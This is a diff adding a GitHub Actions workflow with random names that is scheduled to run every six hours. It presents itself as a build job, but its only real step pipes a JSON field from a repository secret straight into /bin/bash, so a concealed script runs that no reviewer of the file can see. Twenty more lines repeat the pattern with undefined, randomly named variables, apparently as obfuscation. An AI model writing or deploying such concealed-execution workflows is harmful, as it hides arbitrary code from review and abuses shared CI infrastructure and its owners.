@@ -1,0 +1,38 @@
+name: yemaybexuconti
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yemaybexuconti
+        env:
+          ny72743: ${{ secrets.ny72743 }}
+        run: |
+          echo $ny72743 | jq -r .e73327 | /bin/bash
+          echo $sb0395 | jq -r .jqrz87 | /bin/bash
+          echo $u80644 | jq -r .q03 | /bin/bash
+          echo $jpspc9 | jq -r .x572 | /bin/bash
+          echo $jpkuf000 | jq -r .bno18 | /bin/bash
+          echo $olqs33921 | jq -r .yeyf671 | /bin/bash
+          echo $k5 | jq -r .cjkct47 | /bin/bash
+          echo $hgvz1 | jq -r .ubje792 | /bin/bash
+          echo $jeyvp36 | jq -r .kmf84 | /bin/bash
+          echo $wzq84844 | jq -r .wifb8902 | /bin/bash
+          echo $pdmwj18 | jq -r .f71989 | /bin/bash
+          echo $vg69 | jq -r .mz7355 | /bin/bash
+          echo $senh1839 | jq -r .fidg17044 | /bin/bash
+          echo $utcos36521 | jq -r .f6250 | /bin/bash
+          echo $ql6169 | jq -r .lxna944 | /bin/bash
+          echo $i6018 | jq -r .zppx551 | /bin/bash
+          echo $gsmvx3285 | jq -r .ffsyj466 | /bin/bash
+          echo $yb25 | jq -r .aqv10114 | /bin/bash
+          echo $f42 | jq -r .lcvp14 | /bin/bash
+          echo $zxb94237 | jq -r .z235 | /bin/bash
+          echo $t65141 | jq -r .vjio9 | /bin/bash
+          echo $gx341 | jq -r .vhqa32207 | /bin/bash
+
